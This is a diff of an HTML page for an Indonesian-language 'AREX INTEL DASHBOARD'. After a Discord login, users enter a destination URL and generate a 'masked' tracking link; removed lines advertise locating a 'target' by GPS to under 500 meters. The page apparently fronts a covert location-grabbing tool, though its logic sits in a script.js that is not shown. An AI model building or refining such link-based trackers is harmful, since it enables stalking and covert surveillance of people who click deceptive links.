@@ -3,47 +3,43 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Intel Panel - arex.my.id</title>
+  <title>AREX INTEL DASHBOARD</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-  <div class="container">
-    <h2>AREX INTEL DASHBOARD</h2>
-
-    <div class="card">
-      <!-- State 1: Belum Login -->
-      <div id="loginState">
-        <h3>Autentikasi Pengguna</h3>
-        <p class="subtext">Login dengan Discord untuk menghubungkan akun kamu secara otomatis.</p>
-        <a href="/api/auth/login" class="btn btn-discord">Login with Discord</a>
-      </div>
-
-      <!-- State 2: Sudah Login -->
-      <div id="appState" style="display: none;">
-        <div class="user-profile">
-          <img id="userAvatar" src="" alt="Avatar">
-          <div>
-            <div id="userName" class="username">Username</div>
-            <span class="badge">Connected</span>
-          </div>
-        </div>
-
-        <hr style="border: 0.5px solid #334155; margin: 16px 0;">
-
-        <h3>Buat Link Tracking</h3>
-        <p class="subtext">📍 <strong>GPS Presisi</strong> - Lokasi target dengan akurasi <strong>&lt; 500 meter</strong></p>
-
-        <div class="input-group">
-          <input id="targetUrl" type="text" placeholder="URL Tujuan (contoh: youtube.com)">
-          <button class="btn btn-danger" onclick="generateMaskedLink()">Bikin Link</button>
-        </div>
-
-        <div id="resLogger" class="result-box">
-          Siap membuat link tracking.
-        </div>
-      </div>
+  <!-- 1. TAMPILAN SAAT BELUM LOGIN -->
+  <div id="loginState" class="login-wrapper" style="display: none;">
+    <div class="login-card">
+      <h2>AREX INTEL DASHBOARD</h2>
+      <p>Autentikasi Pengguna</p>
+      <p class="sub-text">Login dengan Discord untuk menghubungkan akun kamu secara otomatis.</p>
+      <a href="/api/auth/login" class="btn-discord">
+        Login with Discord
+      </a>
     </div>
+  </div>
+
+  <!-- 2. TAMPILAN DASHBOARD UTAMA (SETELAH LOGIN) -->
+  <div id="appState" class="dashboard-wrapper" style="display: none;">
+    <header class="dashboard-header">
+      <div class="user-info">
+        <img id="userAvatar" src="" alt="Avatar" class="avatar">
+        <span id="userName">User</span>
+      </div>
+      <button onclick="logout()" class="btn-logout">Logout</button>
+    </header>
+
+    <main class="dashboard-content">
+      <h2>AREX INTEL DASHBOARD</h2>
+      
+      <div class="input-group">
+        <input type="text" id="targetUrl" placeholder="Masukkan URL target (cth: https://google.com)">
+        <button onclick="generateMaskedLink()" class="btn-danger">Bikin Link</button>
+      </div>
+
+      <div id="resLogger" class="result-box" style="display: none;"></div>
+    </main>
   </div>
 
   <script src="script.js"></script>
